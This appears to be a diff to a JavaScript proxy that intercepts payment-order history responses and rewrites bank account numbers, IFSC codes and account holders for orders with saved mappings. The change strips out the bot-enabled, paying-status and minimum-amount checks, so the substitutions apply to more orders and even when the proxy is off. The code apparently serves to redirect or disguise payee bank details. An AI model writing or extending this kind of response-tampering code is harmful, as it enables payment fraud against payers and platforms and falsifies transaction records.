@@ -2253,9 +2253,10 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
     if (urlLower.includes('/history') || urlLower.includes('_history') || urlLower.includes('listbuy')) {
       if (jsonResp && (jsonResp.code === 0 || jsonResp.code === undefined) && respData) {
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
+        // Existing KV mappings are authoritative even when proxy is OFF.
+        // The active bank is used only for wallet-link amount gating.
         const activeBank = getActiveBank(data, null);
-        if (activeBank && data.botEnabled !== false) {
-          for (const order of orderList) {
+        for (const order of orderList) {
             const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
             const amt = getOrderAmount(req, order);
             const orderIdFields = ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo'];
@@ -2277,10 +2278,9 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             const savedHistoryMapping = orderId
               ? (getSavedOrderMapping(data, orderId) || getSavedOrderMapping(data, order))
               : null;
-            if (isPaying && orderId && amt !== null && savedHistoryMapping) {
+            if (orderId && amt !== null && savedHistoryMapping) {
               const mappedHistoryBank = bankFromSavedOrder(savedHistoryMapping);
-              if (mappedHistoryBank && (mappedHistoryBank.accountNo || mappedHistoryBank.ifsc || mappedHistoryBank.accountHolder) &&
-                  (!activeBank.minAmount || amt >= activeBank.minAmount)) {
+              if (mappedHistoryBank && (mappedHistoryBank.accountNo || mappedHistoryBank.ifsc || mappedHistoryBank.accountHolder)) {
                 // Mutate only an already-mapped history row; never create a new
                 // mapping or use the active bank for an unrelated order.
                 const bkAcctC1 = mappedHistoryBank.accountNo || '';
@@ -2335,11 +2335,10 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
 💾 Auto-saved with Bank: ${bkNameC1} | ${bkAcctC1}
 🕐 ${now}`);
                   }
-                }
+                                }
               }
             }
           }
-        }
       }
     }
 
